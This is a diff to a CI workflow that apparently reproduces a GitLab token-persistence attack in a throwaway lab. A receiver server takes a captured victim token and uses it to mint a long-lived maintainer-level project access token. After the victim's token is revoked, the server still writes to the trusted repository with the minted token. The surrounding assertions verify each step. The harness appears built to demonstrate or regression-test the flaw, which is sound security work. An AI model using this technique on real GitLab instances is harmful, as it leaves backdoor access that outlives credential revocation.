@@ -167,6 +167,7 @@ jobs:
           must("POST", f"/api/v4/projects/{a['id']}/members",
                {"user_id": users["victim"]["id"], "access_level": 40}, root_token)
           tokens = {}
+          token_ids = {}
           for role, user in users.items():
               token_result = must(
                   "POST", f"/api/v4/users/{user['id']}/personal_access_tokens",
@@ -174,6 +175,7 @@ jobs:
                    "expires_at": (datetime.date.today() + datetime.timedelta(days=1)).isoformat()},
                   root_token)
               tokens[role] = token_result["token"]
+              token_ids[role] = token_result["id"]
               print("::add-mask::" + tokens[role])
           summary["group_id"] = gid
           summary["projects"] = {"trusted_a": a["id"], "lower_b": b["id"]}
@@ -188,6 +190,8 @@ jobs:
                                        "kind": "ephemeral owned GitLab A-Maintainer PAT"}
 
           lower_events = pathlib.Path("/tmp") / ("l108-events-" + suffix + ".jsonl")
+          retained_event = pathlib.Path("/tmp") / ("l108-retained-" + suffix + ".json")
+          project_token_file = pathlib.Path("/tmp") / ("l108-project-token-" + suffix)
           lower_port = pathlib.Path("/tmp") / ("l108-port-" + suffix)
           lower_server = pathlib.Path("/tmp") / ("l108-server-" + suffix + ".py")
           lower_server.write_text(textwrap.dedent(f"""
@@ -196,8 +200,11 @@ jobs:
               BASE = {base!r}
               PROJECT = {a["id"]!r}
               EVENTS = pathlib.Path({str(lower_events)!r})
+              RETAINED_EVENT = pathlib.Path({str(retained_event)!r})
+              PROJECT_TOKEN_FILE = pathlib.Path({str(project_token_file)!r})
               PORT = pathlib.Path({str(lower_port)!r})
               SUFFIX = {suffix!r}
+              EXPIRES = {(datetime.date.today() + datetime.timedelta(days=2)).isoformat()!r}
               count = 0
               class Handler(BaseHTTPRequestHandler):
                   def do_POST(self):
@@ -223,8 +230,64 @@ jobs:
                           status = error.code
                       event = {{"uid": os.getuid(), "token_sha256": hashlib.sha256(token).hexdigest(),
                                "gitlab_write_http": status, "path": path}}
+                      if count == 3:
+                          mint_payload = json.dumps({{
+                              "name": "owned-l108-retained-" + SUFFIX,
+                              "scopes": ["api"], "access_level": 40,
+                              "expires_at": EXPIRES
+                          }}).encode()
+                          mint_request = urllib.request.Request(
+                              BASE + f"/api/v4/projects/{{PROJECT}}/access_tokens",
+                              data=mint_payload,
+                              headers={{"PRIVATE-TOKEN": token.decode(),
+                                       "Content-Type": "application/json"}},
+                              method="POST")
+                          try:
+                              with urllib.request.urlopen(mint_request, timeout=45) as response:
+                                  mint_status = response.status
+                                  minted = json.load(response)
+                          except urllib.error.HTTPError as error:
+                              mint_status = error.code
+                              minted = {{}}
+                          event["project_token_create_http"] = mint_status
+                          if mint_status == 201 and minted.get("token"):
+                              project_token = minted["token"]
+                              PROJECT_TOKEN_FILE.write_text(project_token)
+                              PROJECT_TOKEN_FILE.chmod(0o600)
+                              event["project_token_sha256"] = hashlib.sha256(
+                                  project_token.encode()).hexdigest()
+                              event["project_token_id"] = minted.get("id")
                       with EVENTS.open("a") as out:
                           out.write(json.dumps(event) + "\\n")
+                      self.send_response(204)
+                      self.end_headers()
+                  def do_GET(self):
+                      if self.path != "/retained" or not PROJECT_TOKEN_FILE.exists():
+                          self.send_response(404)
+                          self.end_headers()
+                          return
+                      project_token = PROJECT_TOKEN_FILE.read_text()
+                      path = "owned-l108-retained-" + SUFFIX + ".txt"
+                      payload = json.dumps({{
+                          "branch": "main", "content": "INERT_L108_RETAINED_AFTER_REVOKE",
+                          "commit_message": "Owned L108 retained-token control"
+                      }}).encode()
+                      request = urllib.request.Request(
+                          BASE + f"/api/v4/projects/{{PROJECT}}/repository/files/{{path}}",
+                          data=payload,
+                          headers={{"PRIVATE-TOKEN": project_token,
+                                   "Content-Type": "application/json"}},
+                          method="POST")
+                      try:
+                          with urllib.request.urlopen(request, timeout=45) as response:
+                              status = response.status
+                      except urllib.error.HTTPError as error:
+                          status = error.code
+                      RETAINED_EVENT.write_text(json.dumps({{
+                          "uid": os.getuid(), "project_token_sha256": hashlib.sha256(
+                              project_token.encode()).hexdigest(),
+                          "gitlab_write_http": status, "path": path
+                      }}))
                       self.send_response(204)
                       self.end_headers()
                   def log_message(self, *_):
@@ -274,6 +337,16 @@ jobs:
                                       "http": denied_write})
           if denied_write not in (403, 404):
               raise RuntimeError("Lower publisher unexpectedly wrote trusted A repository")
+          denied_mint, _ = request(
+              "POST", f"/api/v4/projects/{a['id']}/access_tokens",
+              {"name": "owned-l108-lower-denied", "scopes": ["api"],
+               "access_level": 40,
+               "expires_at": (datetime.date.today() + datetime.timedelta(days=2)).isoformat()},
+              token=tokens["publisher"])
+          summary["controls"].append({"case": "lower_publisher_mint_trusted_a_token",
+                                      "http": denied_mint})
+          if denied_mint not in (403, 404):
+              raise RuntimeError("Lower publisher unexpectedly minted trusted A project token")
           reader_get, _ = request("GET", f"/api/v4/projects/{a['id']}",
                                   token=tokens["reader"])
           summary["controls"].append({"case": "reader_get_trusted_a", "http": reader_get})
@@ -582,7 +655,9 @@ jobs:
                       len(events) != before + 1 or
                       events[-1]["token_sha256"] != hashlib.sha256(protected_bytes).hexdigest() or
                       events[-1]["uid"] != 65534 or
-                      events[-1]["gitlab_write_http"] != 201):
+                      events[-1]["gitlab_write_http"] != 201 or
+                      events[-1].get("project_token_create_http") != 201 or
+                      not events[-1].get("project_token_sha256")):
                   raise RuntimeError("One-shot signed-tool policy consequence failed: " +
                                      output.replace(tokens["reader"], "[masked]")[-700:])
 
@@ -652,6 +727,54 @@ jobs:
                        "expected_sha256": hashlib.sha256(expected.encode()).hexdigest()})
                   if code != 200 or content != expected:
                       raise RuntimeError("Protected A repository file readback mismatch")
+              if not project_token_file.exists():
+                  raise RuntimeError("Lower receiver did not retain project token")
+              project_token_stat = project_token_file.stat()
+              summary["controls"].append({
+                  "case": "retained_token_lower_os_file",
+                  "uid": project_token_stat.st_uid,
+                  "mode": oct(project_token_stat.st_mode & 0o777)})
+              if project_token_stat.st_uid != 65534 or (
+                      project_token_stat.st_mode & 0o777) != 0o600:
+                  raise RuntimeError("Retained token was not held only by lower UID")
+              revoked_code, _ = request(
+                  "DELETE", f"/api/v4/personal_access_tokens/{token_ids['victim']}",
+                  token=root_token)
+              summary["controls"].append({"case": "victim_pat_revoked",
+                                          "http": revoked_code})
+              if revoked_code != 204:
+                  raise RuntimeError("Victim PAT revocation did not complete")
+              old_code, _ = request("GET", f"/api/v4/projects/{a['id']}",
+                                    token=tokens["victim"])
+              summary["controls"].append({"case": "revoked_victim_pat_rejected",
+                                          "http": old_code})
+              if old_code not in (401, 403):
+                  raise RuntimeError("Revoked victim PAT remained usable")
+              with urllib.request.urlopen(
+                      "http://127.0.0.1:" + lower_port.read_text().strip() +
+                      "/retained", timeout=60) as response:
+                  retained_trigger_http = response.status
+              summary["controls"].append({"case": "lower_retained_action_trigger",
+                                          "http": retained_trigger_http})
+              if retained_trigger_http != 204 or not retained_event.exists():
+                  raise RuntimeError("Lower retained-token action did not run")
+              retained = json.loads(retained_event.read_text())
+              summary["retained_project_token_event"] = retained
+              if (retained["uid"] != 65534 or
+                      retained["project_token_sha256"] != events[-1]["project_token_sha256"] or
+                      retained["gitlab_write_http"] != 201):
+                  raise RuntimeError("Retained project token failed after victim revocation")
+              retained_code, retained_content = request(
+                  "GET", f"/api/v4/projects/{a['id']}/repository/files/" +
+                  retained["path"] + "/raw?ref=main", token=root_token)
+              expected_retained = "INERT_L108_RETAINED_AFTER_REVOKE"
+              summary["controls"].append({
+                  "case": "trusted_a_written_after_victim_revoke",
+                  "http": retained_code,
+                  "content_sha256": hashlib.sha256(str(retained_content).encode()).hexdigest(),
+                  "expected_sha256": hashlib.sha256(expected_retained.encode()).hexdigest()})
+              if retained_code != 200 or retained_content != expected_retained:
+                  raise RuntimeError("Retained project token A write readback mismatch")
           except Exception as error:
               redacted = str(error)
               for secret in [root_token, *tokens.values()]:
